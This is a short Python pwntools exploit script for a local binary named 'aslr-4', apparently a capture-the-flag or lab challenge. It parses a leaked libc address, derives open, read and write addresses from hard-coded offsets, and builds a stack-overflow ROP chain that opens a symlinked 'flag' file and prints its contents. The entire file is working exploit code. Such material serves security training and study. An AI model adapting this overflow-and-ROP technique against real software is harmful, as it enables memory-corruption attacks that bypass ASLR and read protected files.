#!/usr/bin/env python

from pwn import *
import os

p = process('./aslr-4')
data = p.recv()
print(data.split())
addr = (data.split())[14]
print (addr)


"""
pwndbg> print open
$1 = {<text variable, no debug info>} 0xb7de16f0 <open>
pwndbg> print write
$2 = {<text variable, no debug info>} 0xb7de1b70 <write>
pwndbg> print read
$3 = {<text variable, no debug info>} 0xb7de1b00 <read>
"""

buf = "A" * 0x88 + "BBBB"

open_int = int(addr, 16) + 573568
read_int = open_int + 1040
write_int = read_int + 112

open_ = p32(open_int)
read_ = p32(read_int)
write_= p32(write_int)


pop_pop_pop_ret = p32(0x08048659)

string = p32(0x8048768)
if os.path.exists("@"):
    os.unlink("@")

os.symlink("./flag", "@")

buf += open_
buf += pop_pop_pop_ret
buf += string
buf += p32(0)
buf += p32(0)

buf += read_
buf += pop_pop_pop_ret
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

buf += write_
buf += pop_pop_pop_ret
buf += p32(1)
buf += p32(0x804a800)
buf += p32(100)


with open("e.txt", "w") as f:
    f.write(buf)
    f.close

#print(len(buf))
#p.send(buf)
#print(p.recv())
#time.sleep(0.1)
#p.sendline(str(len(buf)))
#print(p.recv())
#time.sleep(0.1)
p.sendline(buf)
p.interactive()

